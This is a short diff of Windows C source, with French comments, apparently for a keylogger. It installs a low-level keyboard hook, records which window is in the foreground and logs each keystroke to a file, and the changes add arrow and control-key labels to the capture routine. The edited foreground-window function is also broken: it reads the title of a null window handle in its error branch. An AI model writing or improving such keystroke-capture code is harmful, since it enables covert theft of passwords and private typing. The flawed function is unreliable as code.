@@ -43,7 +43,7 @@ void	AffProcessName(DWORD processID, const char *path)
 	fclose(file);
 }
 
-int    forground_process()
+int    forground_process(void)
 {
 	/*
 		function qui permet de récup et d'afficher le forground process
@@ -51,12 +51,13 @@ int    forground_process()
 	*/
 	HWND    hwnd;
 	DWORD   pid;
+	WCHAR	title[256] = L"";
 
 	hwnd = GetForegroundWindow();
 
 	if (!hwnd) {
-		printf("no foreground process detect\n");
-		return 1;
+		GetWindowTextW(hwnd, title, 256);
+		wprintf(L"fenetre active : %ls\n", title);
 	}
 
 	GetWindowThreadProcessId(hwnd, &pid);
@@ -97,7 +98,13 @@ int write_key(const char *path, int vkCode)
             case VK_BACK: fprintf(file, "[BACK]"); break;
             case VK_SHIFT: fprintf(file, "[SHIFT]"); break;
             case VK_CONTROL: fprintf(file, "[CTRL]"); break;
+			case VK_RCONTROL: fprintf(file, "[RCTRL]"); break;
+			case VK_LCONTROL: fprintf(file, "[LCTRL]"); break;
             case VK_MENU: fprintf(file, "[ALT]"); break;
+			case VK_UP: fprintf(file, "[UP]"); break;
+			case VK_DOWN: fprintf(file, "[DOWN]"); break;
+			case VK_LEFT: fprintf(file, "[LEFT]"); break;
+			case VK_RIGHT: fprintf(file, "[RIGHT]"); break;
             default: fprintf(file, "<%d>", vkCode); break;
         }
     }
@@ -136,7 +143,7 @@ LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
 		ca utilise tout ce qu'il y a avant pour en faire un seul bloc
 		la function de goat finallement
 	*/
-    int vkCode = ((KBDLLHOOKSTRUCT *)lparam)->vkCode;
+    int		vkCode = ((KBDLLHOOKSTRUCT *)lparam)->vkCode;
 
 	if (wparam == WM_KEYUP) {
         HWND hwnd = GetForegroundWindow();
